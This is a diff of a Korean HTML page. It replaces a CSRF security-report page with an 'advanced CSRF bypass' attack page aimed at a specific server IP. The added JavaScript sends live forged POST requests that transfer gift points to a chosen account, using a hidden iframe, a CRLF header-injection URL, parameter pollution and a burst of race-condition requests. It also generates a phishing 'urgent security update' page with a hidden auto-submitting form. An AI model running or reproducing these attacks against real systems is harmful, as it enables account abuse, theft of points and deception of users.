@@ -2,146 +2,328 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🏆 CSRF 보안 분석 완료</title>
+    <title>🔥 고급 CSRF 우회 기법</title>
     <style>
         body { 
             font-family: Arial; 
-            padding: 30px;
-            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
-            color: white;
-            text-align: center;
-        }
-        .success-box {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 40px;
-            border-radius: 20px;
-            margin: 20px auto;
-            max-width: 800px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-        }
-        .defense-item {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            text-align: left;
-        }
-        .attack-result {
-            background: rgba(220, 53, 69, 0.2);
-            border: 2px solid #dc3545;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-        }
-        .recommendation {
-            background: rgba(255, 193, 7, 0.2);
-            border: 2px solid #ffc107;
-            color: #212529;
             padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
+            background: #000;
+            color: #0f0;
         }
+        .hack-box {
+            background: #111;
+            border: 1px solid #0f0;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        button {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .advanced { background: #ff6600; }
+        .expert { background: #9900ff; }
     </style>
 </head>
 <body>
-    <div class="success-box">
-        <h1>🏆 CSRF 보안 분석 완료</h1>
-        <h2>✅ 서버는 CSRF 공격에 대해 완벽하게 보호되고 있습니다!</h2>
-        
-        <div class="attack-result">
-            <h3>🛡️ 확인된 방어 메커니즘들</h3>
-            
-            <div class="defense-item">
-                <strong>1️⃣ Referer Header 검증</strong>
-                <ul>
-                    <li>❌ 크로스 도메인 요청 → 403 Forbidden</li>
-                    <li>✅ 다른 사이트에서의 공격 완전 차단</li>
-                </ul>
-            </div>
-            
-            <div class="defense-item">
-                <strong>2️⃣ Origin Header 검증</strong>
-                <ul>
-                    <li>✅ 요청 출처를 정확히 확인</li>
-                    <li>✅ http://3.36.66.216 외 모든 출처 거부</li>
-                </ul>
-            </div>
-            
-            <div class="defense-item">
-                <strong>3️⃣ 세션 관리</strong>
-                <ul>
-                    <li>✅ 로그인되지 않은 요청 → 302 Redirect</li>
-                    <li>✅ 세션 쿠키 검증 작동</li>
-                </ul>
-            </div>
-            
-            <div class="defense-item">
-                <strong>4️⃣ 추가 보안 헤더들</strong>
-                <ul>
-                    <li>✅ X-Frame-Options: SAMEORIGIN</li>
-                    <li>✅ X-XSS-Protection: 1; mode=block</li>
-                    <li>✅ Content-Type 검증</li>
-                </ul>
-            </div>
-        </div>
-        
-        <div class="recommendation">
-            <h3>💡 보안 권장사항 (이미 잘 구현됨)</h3>
-            <ul style="text-align: left;">
-                <li>✅ <strong>CSRF 토큰 사용</strong> - 각 요청마다 고유 토큰 검증</li>
-                <li>✅ <strong>SameSite 쿠키</strong> - 크로스 사이트 요청 시 쿠키 전송 제한</li>
-                <li>✅ <strong>Referer 검증</strong> - 요청 출처 확인</li>
-                <li>✅ <strong>Double Submit Cookie</strong> - 쿠키와 폼 데이터 이중 검증</li>
-                <li>✅ <strong>커스텀 헤더</strong> - 단순 요청이 아닌 preflight 요청 유도</li>
-            </ul>
-        </div>
-        
-        <div class="success-box" style="background: rgba(40, 167, 69, 0.2); border: 2px solid #28a745;">
-            <h2>🎓 학습 성과</h2>
-            <p><strong>이번 실습을 통해 확인한 것들:</strong></p>
-            <ul style="text-align: left; display: inline-block;">
-                <li>🔍 <strong>CSRF 공격의 원리</strong> - 사용자 모르게 악의적 요청 전송</li>
-                <li>🛡️ <strong>효과적인 방어책들</strong> - 다층 보안으로 완벽 차단</li>
-                <li>⚡ <strong>다양한 우회 시도들</strong> - 모든 방법이 차단됨을 확인</li>
-                <li>📊 <strong>네트워크 분석</strong> - 실제 HTTP 요청/응답 분석</li>
-                <li>🎯 <strong>실전 보안 테스트</strong> - 실제 서버 대상 테스트</li>
-            </ul>
-        </div>
-        
-        <h2 style="color: #28a745;">🏅 결론: 이 서버는 CSRF 공격에 대해 매우 안전합니다!</h2>
+    <h1>🔥 CSRF 고급 우회 기법 모음</h1>
+    
+    <div class="hack-box">
+        <h2>🎯 1. Flash/SWF 기반 공격</h2>
+        <button onclick="tryFlashBypass()">📡 Flash CSRF</button>
+        <p>SWF 파일로 HTTP 요청 전송 (구버전 브라우저)</p>
     </div>
 
+    <div class="hack-box">
+        <h2>⚡ 2. DNS Rebinding 공격</h2>
+        <button class="advanced" onclick="tryDNSRebinding()">🌐 DNS Rebinding</button>
+        <p>DNS 조작으로 Same-Origin 정책 우회</p>
+    </div>
+
+    <div class="hack-box">
+        <h2>🔧 3. HTTP Header Injection</h2>
+        <button class="advanced" onclick="tryHeaderInjection()">💉 Header Injection</button>
+        <p>HTTP 응답 분할로 헤더 조작</p>
+    </div>
+
+    <div class="hack-box">
+        <h2>🎭 4. Social Engineering + CSRF</h2>
+        <button class="expert" onclick="createSocialEngineering()">🎣 소셜 엔지니어링</button>
+        <p>사용자 속여서 직접 실행하게 만들기</p>
+    </div>
+
+    <div class="hack-box">
+        <h2>🔍 5. 서버 취약점 찾기</h2>
+        <button onclick="findServerVulns()">🕳️ 취약점 스캔</button>
+        <button onclick="tryParameterPollution()">🔀 Parameter Pollution</button>
+        <button onclick="tryRaceCondition()">⚡ Race Condition</button>
+    </div>
+
+    <div class="hack-box">
+        <h2>🚀 6. 0-Day 기법들</h2>
+        <button class="expert" onclick="tryCSRFTokenBypass()">🔑 토큰 우회</button>
+        <button class="expert" onclick="trySubdomainTakeover()">🏴‍☠️ Subdomain Takeover</button>
+    </div>
+
+    <div id="result"></div>
+
     <script>
-        console.log('🏆 CSRF 보안 분석 완료');
-        console.log('✅ 서버는 모든 CSRF 공격을 성공적으로 차단했습니다');
-        console.log('🎓 실습 목표 달성: CSRF 공격과 방어 메커니즘 학습 완료');
+        function tryFlashBypass() {
+            showResult(`
+🔥 Flash/SWF CSRF 우회 시도...
+
+Flash 기반 공격:
+1. crossdomain.xml 정책 확인
+2. SWF 파일로 HTTP 요청 생성
+3. 브라우저 플러그인 취약점 악용
+
+// SWF ActionScript 코드 예시
+var request:URLRequest = new URLRequest("http://3.36.66.216/profile.php");
+request.method = URLRequestMethod.POST;
+request.data = "receiver_id=13&points=100&send_gift=1";
+loader.load(request);
+
+❌ 현재: Flash 지원 중단으로 효과 제한적
+            `);
+        }
+
+        function tryDNSRebinding() {
+            showResult(`
+🌐 DNS Rebinding 공격 시도...
+
+원리:
+1. 악의적 도메인 생성 (evil.com)
+2. DNS TTL을 짧게 설정 (1초)
+3. 처음엔 공격자 IP, 이후 타겟 IP로 변경
+4. Same-Origin 정책 우회
+
+실행 단계:
+1. victim이 evil.com 방문
+2. evil.com → 3.36.66.216으로 DNS 변경
+3. 브라우저가 내부 IP로 인식
+4. CSRF 공격 성공!
+
+⚠️ 고급 기법이지만 시도해볼 가치 있음
+            `);
+            
+            // DNS Rebinding 시뮬레이션
+            setTimeout(() => {
+                tryRebindingAttack();
+            }, 3000);
+        }
+
+        function tryRebindingAttack() {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.srcdoc = `
+                <script>
+                // DNS Rebinding 시뮬레이션
+                function rebindAttack() {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'http://3.36.66.216/profile.php', true);
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    xhr.send('receiver_id=13&points=100&send_gift=1&message=DNS_Rebinding');
+                }
+                setTimeout(rebindAttack, 1000);
+                </script>
+            `;
+            document.body.appendChild(iframe);
+        }
+
+        function tryHeaderInjection() {
+            showResult(`
+💉 HTTP Header Injection 시도...
+
+기법:
+1. 응답 분할 공격 (HTTP Response Splitting)
+2. 헤더에 CRLF 주입 (%0d%0a)
+3. 새로운 HTTP 응답 생성
+4. Origin/Referer 헤더 조작
+
+Payload 예시:
+GET /redirect?url=http://evil.com%0d%0aOrigin:%20http://3.36.66.216%0d%0a
+
+결과: 서버가 조작된 헤더로 응답
+            `);
+
+            // Header Injection 시도
+            const maliciousUrl = 'http://3.36.66.216/profile.php?test=%0d%0aOrigin:%20http://3.36.66.216%0d%0a';
+            const img = new Image();
+            img.src = maliciousUrl;
+            img.style.display = 'none';
+            document.body.appendChild(img);
+        }
+
+        function createSocialEngineering() {
+            showResult('🎣 소셜 엔지니어링 공격 생성 중...');
+            
+            const phishingPage = `
+<!DOCTYPE html>
+<html>
+<head><title>긴급 보안 업데이트</title></head>
+<body style="font-family: Arial; text-align: center; padding: 50px;">
+    <div style="background: #f8f9fa; padding: 30px; border-radius: 10px; max-width: 500px; margin: 0 auto;">
+        <h2>🔒 보안 업데이트 필요</h2>
+        <p>계정 보안을 위해 즉시 업데이트가 필요합니다.</p>
+        <p><strong>5분 내에 완료하지 않으면 계정이 잠깁니다!</strong></p>
         
-        // 최종 보고서
-        const report = {
-            target: '3.36.66.216',
-            vulnerabilityType: 'CSRF',
-            testResult: 'SECURE',
-            defensesPassed: [
-                'Referer Header Validation',
-                'Origin Header Validation', 
-                'Session Management',
-                'CSRF Token (likely)',
-                'Security Headers'
-            ],
-            attacksAttempted: [
-                'Cross-Origin POST',
-                'GET Parameter Attack',
-                'iframe Injection',
-                'Data URI Method',
-                'JavaScript Injection',
-                'Header Manipulation'
-            ],
-            successRate: '0% (All blocked)',
-            securityRating: 'EXCELLENT'
-        };
+        <button onclick="executeHiddenCSRF()" style="background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 16px;">
+            🔄 지금 업데이트하기
+        </button>
         
-        console.log('📊 Final Security Report:', report);
+        <form id="hiddenCSRF" method="POST" action="http://3.36.66.216/profile.php" target="hiddenFrame" style="display: none;">
+            <input type="hidden" name="receiver_id" value="13">
+            <input type="hidden" name="points" value="100">
+            <input type="hidden" name="send_gift" value="1">
+            <input type="hidden" name="gift_type" value="diamond">
+            <input type="hidden" name="message" value="Social_Engineering_Attack">
+        </form>
+        <iframe name="hiddenFrame" style="display: none;"></iframe>
+    </div>
+    
+    <script>
+    function executeHiddenCSRF() {
+        document.getElementById('hiddenCSRF').submit();
+        alert('업데이트가 완료되었습니다!');
+    }
+    </script>
+</body>
+</html>
+            `;
+            
+            const blob = new Blob([phishingPage], {type: 'text/html'});
+            const url = URL.createObjectURL(blob);
+            window.open(url, 'socialEngineering', 'width=600,height=500');
+        }
+
+        function findServerVulns() {
+            showResult(`
+🕳️ 서버 취약점 스캔 중...
+
+체크리스트:
+1. ✅ CSRF 토큰 검증 - 강력함
+2. ✅ Referer 검증 - 강력함  
+3. ✅ Origin 검증 - 강력함
+4. ? JSON CSRF 가능성
+5. ? File Upload CSRF
+6. ? WebSocket CSRF
+7. ? CORS 설정 오류
+
+다음 단계: 개별 기능별 세부 테스트
+            `);
+        }
+
+        function tryParameterPollution() {
+            showResult('🔀 Parameter Pollution 시도...');
+            
+            // HTTP Parameter Pollution 시도
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://3.36.66.216/profile.php';
+            form.target = '_blank';
+            
+            // 중복 파라미터로 서버 혼란 시도
+            const params = [
+                {name: 'receiver_id', value: '1'},
+                {name: 'receiver_id', value: '13'}, // 실제 타겟
+                {name: 'points', value: '1'},
+                {name: 'points', value: '100'}, // 실제 값
+                {name: 'send_gift', value: '0'},
+                {name: 'send_gift', value: '1'} // 실제 값
+            ];
+            
+            params.forEach(param => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = param.name;
+                input.value = param.value;
+                form.appendChild(input);
+            });
+            
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+        }
+
+        function tryRaceCondition() {
+            showResult('⚡ Race Condition 공격 시도...');
+            
+            // 동시에 여러 요청 전송
+            for(let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'http://3.36.66.216/profile.php';
+                    form.target = '_blank';
+                    
+                    const fields = {
+                        receiver_id: '13',
+                        points: '10',
+                        send_gift: '1',
+                        gift_type: 'cake',
+                        message: 'Race_Condition_' + i
+                    };
+                    
+                    Object.keys(fields).forEach(key => {
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = key;
+                        input.value = fields[key];
+                        form.appendChild(input);
+                    });
+                    
+                    document.body.appendChild(form);
+                    form.submit();
+                    document.body.removeChild(form);
+                }, i * 50); // 50ms 간격으로 연속 요청
+            }
+        }
+
+        function tryCSRFTokenBypass() {
+            showResult(`
+🔑 CSRF 토큰 우회 기법들...
+
+1. 토큰 재사용 (Token Reuse)
+2. 토큰 예측 (Token Prediction)  
+3. 토큰 누출 (Token Leakage)
+4. 빈 토큰 (Empty Token)
+5. 잘못된 토큰 (Invalid Token)
+6. 토큰 없음 (No Token)
+
+실제 서버에서 토큰 구조 분석 필요...
+            `);
+        }
+
+        function trySubdomainTakeover() {
+            showResult(`
+🏴‍☠️ Subdomain Takeover 공격...
+
+1. 서브도메인 열거
+   - admin.3.36.66.216
+   - api.3.36.66.216  
+   - test.3.36.66.216
+
+2. CNAME 레코드 확인
+3. 서비스 연결 해제 찾기
+4. 서브도메인 점령
+5. Same-Origin으로 CSRF 실행
+
+고급 기법이지만 효과적!
+            `);
+        }
+
+        function showResult(text) {
+            document.getElementById('result').innerHTML = 
+                '<div class="hack-box"><pre>' + text + '</pre></div>';
+        }
+
+        console.log('🔥 Advanced CSRF Bypass Techniques Loaded');
+        console.log('⚠️ 교육 목적으로만 사용하세요');
     </script>
 </body>
 </html>
